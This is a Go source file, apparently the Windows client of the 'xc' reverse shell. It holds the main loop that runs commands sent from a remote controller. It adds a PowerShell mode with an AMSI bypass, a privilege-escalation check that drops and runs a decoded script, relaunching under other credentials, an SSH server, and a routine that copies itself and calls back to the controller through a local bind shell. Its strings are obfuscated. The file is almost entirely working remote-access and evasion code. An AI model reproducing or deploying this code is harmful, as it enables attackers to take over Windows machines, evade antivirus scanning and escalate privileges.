package client

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	//"log"
	"net"
	"os"
	//"syscall"
	"time"
	"strconv"

	"../plugins"
	"../shell"
	"../utils"
	"github.com/hashicorp/yamux"
)

var assemblies = make(map[string][]byte)

// Run runs the mainloop of the shell
func Run(s *yamux.Session, c net.Conn) {
	defer c.Close()

	// open 2nd channel
	signalSession, err := s.Accept()
	if err != nil {
		fmt.Println(err)
	}
	signalScanner := bufio.NewScanner(signalSession)

	scanner := bufio.NewScanner(c)
	homedir, err := os.UserHomeDir()
	if err != nil {
		homedir = utils.Bake("§C:§")
	}
	// init
	plugins.Init(c)
	prompt(c)

	go func() {
		for signalScanner.Scan() {
			command := signalScanner.Text()
			//fmt.Printf("Command %s\n", command)
			switch command {
			case utils.Bake("§!sigint§"):
				if shellPipeReader != nil && shellPipeWriter != nil && shellCmd != nil {
					//log.Println("Quitting shell (Ctrl+C)")
					shellCmd.Process.Kill()
					shellPipeReader.Close()
					shellPipeWriter.Close()
					shellCmd = nil
				}
			default:
				// pass
			}
		}
	}()

	for scanner.Scan() {
		command := scanner.Text()
		if len(command) > 1 {
			argv := splitArgs(command)
			// we only handle commands here that do something on the client side
			// commands that are shared between different os
			help := usage()
			help += "\n"
			help += utils.Bake("§  !powershell§")+ "\n"
			help += utils.Bake("§    * starts powershell with AMSI Bypass§")+ "\n"
			help += utils.Bake("§  !rc <port>§")+ "\n"
			help += utils.Bake("§    * connects to a local bind shell and restarts this client over it§")+ "\n"
			help += utils.Bake("§  !runasps <username> <password> <domain>§")+ "\n"
			help += utils.Bake("§    * restart xc with the specified user using powershell§")+ "\n"
			help += utils.Bake("§  !vulns\n§")
			help += utils.Bake("§    * checks for common vulnerabilities§")+ "\n"
			help += utils.Bake("§  !ssh <port>\n§")
			help += utils.Bake("§    * start ssh server on the specified port§")+ "\n"

			handled := handleSharedCommand(s, c, argv, help, homedir)
			// os specific commands
			if !handled {
				switch argv[0] {
				case utils.Bake("§!vulns§"):					
					privescCheck := utils.Bake("§privesccheck§") // static replacement
					path := utils.Bake(`§\windows\temp\rechteausweitung.ps1§`)
					decodedScript, _ := base64.StdEncoding.DecodeString(privescCheck)
					ioutil.WriteFile(path, []byte(decodedScript), 0644)
					out, _ := shell.ExecPSOutNoAMSI(fmt.Sprintf(utils.Bake("§. %s;Invoke-PrivescCheck -Extended§"), path))
					c.Write([]byte(out))
					os.Remove(path)
					prompt(c)					
				case utils.Bake("§!runasps§"):
					if len(argv) != 4 {
						c.Write([]byte("§Usage: !runas <username> <password> <domain>§"+ "\n"))
					} else {
						shell.RunAsPS(argv[1], argv[2], argv[3], c)
					}
					prompt(c)
				case utils.Bake("§!powershell§"):
					handled = true
					//log.Println("Entering PowerShell")
					shellCmd, _ = shell.Powershell()
					shellPipeReader, shellPipeWriter = io.Pipe()
					shellCmd.Stdin = c
					shellCmd.Stdout = shellPipeWriter
					shellCmd.Stderr = shellPipeWriter
					go io.Copy(c, shellPipeReader)
					shellCmd.Start()
					shellCmd.Wait()
					//log.Println("Exiting PowerShell (exit)")
					prompt(c)
				case utils.Bake("§!ssh§"):
					if len(argv) == 2 {
						port, err := strconv.Atoi(argv[1])
						if err == nil {
							shell.StartSSHServer(port, c)
						} else {
							fmt.Println(err)
						}
					} else {
						c.Write([]byte("Usage: !ssh <port>\n"))
					}
					prompt(c)
				case utils.Bake("§!rc§"):
					if len(argv) == 2 {
						rPort := argv[1]
						lIP, lPort := utils.SplitAddress(c.RemoteAddr().String())
						err := rc(lIP, lPort, rPort)
						if err == nil {
							// no error, this shell should restart in a new user context
							return
						}
					} else {
						c.Write([]byte(utils.Bake("§Usage: !rc <port>§")+"\n"))
					}
					prompt(c)				
				default:
					shell.Exec(command, c)
					prompt(c)
				}
			}
		} else {
			prompt(c)
		}
	}
}

func rc(lIP string, lPort string, rPort string) error {
	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%s", rPort))
	if err != nil {
		return err
	}
	path := shell.CopySelf()
	cmd := fmt.Sprintf(utils.Bake("§c:\\windows\\system32\\cmd.exe /c§") + " %s %s %s\r\n", path, lIP, lPort)
	conn.Write([]byte(cmd))
	time.Sleep(5000 * time.Millisecond)
	conn.Close()
	return nil
}